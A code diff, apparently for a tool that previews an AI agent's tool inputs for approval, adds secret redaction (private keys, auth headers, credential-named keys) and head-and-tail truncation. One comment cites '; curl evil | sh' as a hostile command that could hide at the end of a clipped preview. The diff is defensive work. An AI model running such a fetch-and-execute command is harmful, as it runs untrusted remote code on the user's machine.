@@ -12,6 +12,32 @@ const MAX_TOTAL = 12_000;
 const BLOCKED = new Set(['__proto__', 'prototype', 'constructor']);
 // C0/C1, bidi overrides and zero-width characters can make a command look different from what runs.
 const UNSAFE = /[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f\u200b-\u200f\u202a-\u202e\u2066-\u2069\ufeff]/g;
+// Secrets that would otherwise reach the chat file, the backup, or a phone on plain WiFi. Redacted before the card.
+const SECRETS = [
+  [/-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----/g, '[private key disembunyikan]'],
+  [/\b(authorization\s*[:=]\s*)(bearer\s+|basic\s+|token\s+)?[^\s"',;]+/gi, '$1***'],
+  [/\b([A-Za-z0-9_]*(?:KEY|TOKEN|SECRET|PASSWORD|PASSWD|API)[A-Za-z0-9_]*\s*[:=]\s*)(["']?)[^\s"',;]+/gi, '$1***'],
+  [/(\b[a-z][a-z0-9+.-]*:\/\/)[^/\s:@]+:[^/\s@]+@/gi, '$1***:***@'],
+];
+
+export function redactSecrets(value) {
+  if (typeof value === 'string') {
+    let out = value;
+    for (const [pattern, replacement] of SECRETS) out = out.replace(pattern, replacement);
+    return out;
+  }
+  if (Array.isArray(value)) return value.map(redactSecrets);
+  if (value && typeof value === 'object') {
+    const out = {};
+    for (const [key, item] of Object.entries(value)) {
+      // A key that names a credential hides its value even when the value itself has no pattern (env: {API_KEY: ...}).
+      const sensitive = /key|token|secret|password|passwd|auth|api/i.test(key);
+      out[key] = sensitive && (item == null || typeof item !== 'object') ? (item == null ? item : '***') : redactSecrets(item);
+    }
+    return out;
+  }
+  return value;
+}
 
 const normalize = (p) => {
   let resolved = path.resolve(String(p));
@@ -31,15 +57,18 @@ const normalize = (p) => {
 export function sanitizeToolInput(input, { maxString = MAX_STRING, maxTotal = MAX_TOTAL } = {}) {
   const budget = { left: Math.max(0, Number(maxTotal) || MAX_TOTAL) };
   const clip = (s) => {
-    const clean = s.replace(UNSAFE, ' ');
+    const clean = redactSecrets(s.replace(UNSAFE, ' '));
     const take = Math.max(0, Math.min(Number(maxString) || MAX_STRING, budget.left));
     if (!take) return clean ? '… (dipotong)' : '';
     if (clean.length <= take) {
       budget.left -= clean.length;
       return clean;
     }
+    // Show the head AND the tail: a dangerous `; curl evil | sh` at the end must not hide behind a clipped preview.
+    const tail = Math.min(160, Math.floor(take * 0.3));
+    const head = Math.max(0, take - tail);
     budget.left -= take;
-    return `${clean.slice(0, take)}… (dipotong, ${clean.length} karakter)`;
+    return `${clean.slice(0, head)}… (dipotong, ${clean.length} karakter) …${clean.slice(-tail)}`;
   };
   const walk = (value, depth) => {
     if (value == null) return value;
@@ -71,7 +100,7 @@ export function sanitizeToolInput(input, { maxString = MAX_STRING, maxTotal = MA
     }
     return out;
   };
-  return walk(input ?? {}, 0);
+  return redactSecrets(walk(input ?? {}, 0));
 }
 
 /** The project whose folder contains `cwd` (the deepest match), or null when the terminal is outside every project. */
